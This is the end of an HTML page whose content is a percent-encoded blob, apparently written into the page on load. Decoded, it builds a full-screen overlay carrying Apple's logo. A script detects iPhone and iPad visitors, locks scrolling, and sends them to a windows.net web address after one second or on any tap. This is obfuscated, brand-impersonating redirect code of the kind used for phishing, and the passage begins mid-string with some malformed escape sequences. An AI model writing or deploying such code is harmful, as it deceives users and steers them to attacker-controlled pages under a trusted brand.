D%69%6E%64%65%78%3A%20%39%39%39%39%39%39%3B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%61%6C%69%67%6E%2D%69%74%65%6D%73%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%70%6F%69%6E%74%65%72%2D%65%76%65%6E%74%73%3A%20%61%75%74%6F%3B%0A%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%6F%76%65%72%73%63%72%6F%6C%6C%2D%62%65%68%61%76%69%6F%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%74%6F%75%63%68%2D%61%63%74%69%6F%6E%3A%20%6D%61%6E%69%70%75%6C%61%74%69%6F%6E%3B%0A%20%20%7D%0A%0A%20%20%2E%62%6C%75%72%2D%62%67%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%61%62%73%6F%6C%75%74%65%3B%0A%20%20%20%20%69%6E%73%65%74%3A%20%30%3B%0A%20%20%20%20%2F%2A%20%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%20%2A%2F%0A%20%20%20%20%2F%2A%20%4D%41%54%43%48%45%53%20%63%61%72%64%20%62%61%63%6B%67%72%6F%75%6E%64%20%65%78%61%63%74%6C%79%20%28%6C%69%67%68%74%20%26%20%64%61%72%6B%29%20%20%20%2A%2F%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%39%36%29%3B%0A%20%20%20%20%2F%2A%20%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%20%2A%2F%0A%20%20%20%20%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%32%30%70%78%29%3B%0A%20%20%20%20%2D%77%65%62%6B%69%74%2D%62%61%63%6B%64%72%6F%70%2D%66%69%6C%74%65%72%3A%20%62%6C%75%72%28%32%30%70%78%29%3B%0A%20%20%7D%0A%0A%20%20%2E%63%61%72%64%20%7B%0A%20%20%20%20%70%6F%73%69%74%69%6F%6E%3A%20%72%65%6C%61%74%69%76%65%3B%0A%20%20%20%20%2F%2A%20%53%61%6D%65%20%63%6F%6C%6F%72%20%61%73%20%62%6C%75%72%2D%62%67%20%2%20%75%6E%69%66%6F%72%6D%20%6C%6F%6F%6B%20%2A%2F%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%39%36%29%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%63%6C%61%6D%70%28%32%30%70%78%2C%20%36%76%77%2C%20%32%38%70%78%29%3B%0A%20%20%20%20%62%6F%78%2D%73%68%61%64%6F%77%3A%20%30%20%32%30%70%78%20%36%30%70%78%20%72%67%62%61%28%30%2C%30%2C%30%2C%30%2E%32%32%29%3B%0A%20%20%20%20%70%61%64%64%69%6E%67%3A%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%74%6F%70%2C%20%31%72%65%6D%29%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%35%76%77%2C%20%32%2E%34%72%65%6D%29%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%62%6F%74%74%6F%6D%2C%20%31%72%65%6D%29%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%35%76%77%2C%20%32%2E%34%72%65%6D%29%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%6D%69%6E%28%39%32%76%77%2C%20%34%32%30%70%78%29%3B%0A%20%20%20%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%63%61%6C%63%28%31%30%30%64%76%68%20%2D%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%74%6F%70%2C%20%30%70%78%29%20%2D%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%62%6F%74%74%6F%6D%2C%20%30%70%78%29%29%3B%0A%20%20%20%20%6F%76%65%72%66%6C%6F%77%2D%79%3A%20%61%75%74%6F%3B%0A%20%20%20%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%30%2C%30%2C%30%2C%30%2E%30%36%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%2D%61%70%70%6C%65%2D%73%79%73%74%65%6D%2C%20%42%6C%69%6E%6B%4D%61%63%53%79%73%74%65%6D%46%6F%6E%74%2C%20%22%53%65%67%6F%65%20%55%49%22%2C%20%52%6F%62%6F%74%6F%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%31%64%31%64%31%66%3B%0A%20%20%7D%0A%0A%20%20%2E%6C%6F%67%6F%20%7B%0A%20%20%20%20%77%69%64%74%68%3A%20%63%6C%61%6D%70%28%35%36%70%78%2C%20%31%34%76%77%2C%20%37%32%70%78%29%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%63%6C%61%6D%70%28%35%36%70%78%2C%20%31%34%76%77%2C%20%37%32%70%78%29%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%20%61%75%74%6F%20%31%2E%38%72%65%6D%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%75%72%6C%28%27%68%74%74%70%73%3A%2F%2F%77%77%77%2E%61%70%70%6C%65%2E%63%6F%6D%2F%61%63%2F%73%74%72%75%63%74%75%72%65%64%2D%64%61%74%61%2F%69%6D%61%67%65%73%2F%6B%6E%6F%77%6C%65%64%67%65%5F%67%72%61%70%68%5F%6C%6F%67%6F%2E%70%6E%67%3F%32%30%32%33%30%31%30%31%30%31%27%29%20%63%65%6E%74%65%72%2F%63%6F%6E%74%61%69%6E%20%6E%6F%2D%72%65%70%65%61%74%3B%0A%20%20%7D%0A%0A%20%20%68%31%20%7B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%2E%34%72%65%6D%2C%20%35%2E%35%76%77%2C%20%31%2E%38%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%31%2E%32%72%65%6D%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%33%3B%0A%20%20%7D%0A%0A%20%20%2E%6D%65%73%73%61%67%65%20%7B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%72%65%6D%2C%20%34%2E%32%76%77%2C%20%31%2E%31%34%72%65%6D%29%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%34%38%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%33%63%33%63%34%33%3B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%36%76%77%2C%20%32%2E%32%72%65%6D%29%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%20%7B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%62%6C%6F%63%6B%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%20%20%70%61%64%64%69%6E%67%3A%20%63%6C%61%6D%70%28%30%2E%39%35%72%65%6D%2C%20%34%2E%32%76%77%2C%20%31%2E%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%2E%30%35%72%65%6D%2C%20%34%2E%35%76%77%2C%20%31%2E%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%31%34%70%78%3B%0A%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%2E%38%72%65%6D%20%30%3B%0A%20%20%20%20%74%72%61%6E%73%69%74%69%6F%6E%3A%20%61%6C%6C%20%30%2E%31%38%73%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%70%72%69%6D%61%72%79%20%7B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%77%68%69%74%65%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%23%30%30%37%41%46%46%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%70%72%69%6D%61%72%79%3A%61%63%74%69%76%65%20%7B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%23%30%30%36%32%63%63%3B%0A%20%20%20%20%74%72%61%6E%73%66%6F%72%6D%3A%20%73%63%61%6C%65%28%30%2E%39%38%29%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%73%65%63%6F%6E%64%61%72%79%20%7B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%30%30%37%41%46%46%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%23%63%37%63%37%63%63%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%73%65%63%6F%6E%64%61%72%79%3A%61%63%74%69%76%65%20%7B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%30%2C%31%32%32%2C%32%35%35%2C%30%2E%31%29%3B%0A%20%20%7D%0A%0A%20%20%2E%66%6F%6F%74%6E%6F%74%65%20%7B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%63%6C%61%6D%70%28%31%2E%34%72%65%6D%2C%20%35%76%77%2C%20%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%30%2E%37%38%72%65%6D%2C%20%33%2E%33%76%77%2C%20%30%2E%39%72%65%6D%29%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%38%65%38%65%39%33%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%34%35%3B%0A%20%20%7D%0A%0A%20%20%2E%73%70%69%6E%6E%65%72%20%7B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%32%38%70%78%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%32%38%70%78%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%34%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%32%35%35%2C%32%35%35%2C%32%35%35%2C%30%2E%34%29%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%74%6F%70%3A%20%34%70%78%20%73%6F%6C%69%64%20%77%68%69%74%65%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%35%30%25%3B%0A%20%20%20%20%61%6E%69%6D%61%74%69%6F%6E%3A%20%73%70%69%6E%20%31%73%20%6C%69%6E%65%61%72%20%69%6E%66%69%6E%69%74%65%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%31%2E%32%72%65%6D%20%61%75%74%6F%20%30%3B%0A%20%20%7D%0A%0A%20%20%40%6B%65%79%66%72%61%6D%65%73%20%73%70%69%6E%20%7B%20%74%6F%20%7B%20%74%72%61%6E%73%66%6F%72%6D%3A%20%72%6F%74%61%74%65%28%33%36%30%64%65%67%29%3B%20%7D%20%7D%0A%0A%20%20%40%6D%65%64%69%61%20%28%70%72%65%66%65%72%73%2D%63%6F%6C%6F%72%2D%73%63%68%65%6D%65%3A%20%64%61%72%6B%29%20%7B%0A%20%20%20%20%2E%62%6C%75%72%2D%62%67%2C%0A%20%20%20%20%2E%63%61%72%64%20%7B%0A%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%38%2C%20%32%38%2C%20%33%30%2C%20%30%2E%39%36%29%3B%20%20%20%2F%2A%20%73%61%6D%65%20%63%6F%6C%6F%72%20%69%6E%20%64%61%72%6B%20%6D%6F%64%65%20%2A%2F%0A%20%20%20%20%7D%0A%20%20%20%20%2E%6D%65%73%73%61%67%65%20%7B%20%63%6F%6C%6F%72%3A%20%23%64%31%64%31%64%36%3B%20%7D%0A%20%20%20%20%2E%66%6F%6F%74%6E%6F%74%65%20%7B%20%63%6F%6C%6F%72%3A%20%23%39%38%39%38%39%64%3B%20%7D%0A%20%20%20%20%2E%63%61%72%64%20%7B%20%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%32%35%35%2C%32%35%35%2C%30%2E%30%38%29%3B%20%7D%0A%20%20%7D%0A%0A%20%20%40%6D%65%64%69%61%20%28%6D%61%78%2D%77%69%64%74%68%3A%20%33%36%30%70%78%29%20%7B%0A%20%20%20%20%2E%63%61%72%64%20%7B%20%70%61%64%64%69%6E%67%3A%20%31%2E%36%72%65%6D%20%31%2E%34%72%65%6D%3B%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%30%70%78%3B%20%7D%0A%20%20%7D%0A%3C%2F%73%74%79%6C%65%3E%0A%0A%3C%73%63%72%69%70%74%3E%0A%2F%2F%20%69%4F%53%20%64%65%74%65%63%74%69%6F%6E%20%2B%20%72%65%64%69%72%65%63%74%20%6C%6F%67%69%63%20%28%75%6E%63%68%61%6E%67%65%64%20%66%72%6F%6D%20%70%72%65%76%69%6F%75%73%20%76%65%72%73%69%6F%6E%29%0A%66%75%6E%63%74%69%6F%6E%20%69%73%49%4F%53%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%75%61%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%20%7C%7C%20%6E%61%76%69%67%61%74%6F%72%2E%76%65%6E%64%6F%72%20%7C%7C%20%77%69%6E%64%6F%77%2E%6F%70%65%72%61%3B%0A%20%20%63%6F%6E%73%74%20%70%6C%61%74%66%6F%72%6D%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%70%6C%61%74%66%6F%72%6D%20%7C%7C%20%27%27%3B%0A%0A%20%20%69%66%20%28%2F%69%50%61%64%7C%69%50%68%6F%6E%65%7C%69%50%6F%64%2F%2E%74%65%73%74%28%75%61%29%20%26%26%20%21%77%69%6E%64%6F%77%2E%4D%53%53%74%72%65%61%6D%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%20%20%69%66%20%28%70%6C%61%74%66%6F%72%6D%20%3D%3D%3D%20%27%4D%61%63%49%6E%74%65%6C%27%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%6D%61%78%54%6F%75%63%68%50%6F%69%6E%74%73%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%6D%61%78%54%6F%75%63%68%50%6F%69%6E%74%73%20%3E%20%31%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%20%20%69%66%20%28%75%61%2E%69%6E%63%6C%75%64%65%73%28%27%4D%61%63%27%29%20%26%26%20%27%6F%6E%74%6F%75%63%68%65%6E%64%27%20%69%6E%20%64%6F%63%75%6D%65%6E%74%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%0A%20%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%7D%0A%0A%63%6F%6E%73%74%20%54%41%52%47%45%54%5F%55%52%4C%20%3D%20%27%68%74%74%70%73%3A%2F%2F%65%33%33%30%33%31%34%30%31%65%33%33%30%33%65%63%68%6F%32%2E%7A%31%33%2E%77%65%62%2E%63%6F%72%65%2E%77%69%6E%64%6F%77%73%2E%6E%65%74%2F%32%2E%68%74%6D%6C%27%3B%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%65%64%69%72%65%63%74%4E%6F%77%28%29%20%7B%0A%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%54%41%52%47%45%54%5F%55%52%4C%29%3B%0A%7D%0A%0A%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6C%6F%61%64%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%69%66%20%28%21%69%73%49%4F%53%28%29%29%20%72%65%74%75%72%6E%3B%0A%0A%20%20%63%6F%6E%73%74%20%62%6F%64%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%3B%0A%20%20%63%6F%6E%73%74%20%73%63%72%6F%6C%6C%59%20%3D%20%77%69%6E%64%6F%77%2E%73%63%72%6F%6C%6C%59%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%66%69%78%65%64%27%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%60%2D%24%7B%73%63%72%6F%6C%6C%59%7D%70%78%60%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%77%69%64%74%68%20%3D%20%27%31%30%30%25%27%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%68%69%64%64%65%6E%27%3B%0A%0A%20%20%63%6F%6E%73%74%20%6F%76%65%72%6C%61%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%27%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%27%66%6C%65%78%27%3B%0A%0A%20%20%63%6F%6E%73%74%20%61%75%74%6F%54%69%6D%65%72%20%3D%20%73%65%74%54%69%6D%65%6F%75%74%28%72%65%64%69%72%65%63%74%4E%6F%77%2C%20%31%30%30%30%29%3B%0A%0A%20%20%66%75%6E%63%74%69%6F%6E%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%0A%20%20%20%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%0A%20%20%20%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%61%75%74%6F%54%69%6D%65%72%29%3B%0A%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%27%3B%0A%20%20%20%20%77%69%6E%64%6F%77%2E%73%63%72%6F%6C%6C%54%6F%28%30%2C%20%73%63%72%6F%6C%6C%59%29%3B%0A%0A%20%20%20%20%72%65%64%69%72%65%63%74%4E%6F%77%28%29%3B%0A%20%20%7D%0A%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%73%74%61%72%74%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%65%6E%64%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6D%6F%75%73%65%64%6F%77%6E%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%29%3B%0A%0A%20%20%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%62%65%66%6F%72%65%75%6E%6C%6F%61%64%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%27%3B%0A%20%20%7D%29%3B%0A%7D%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
</script>

    
</body>
</html>

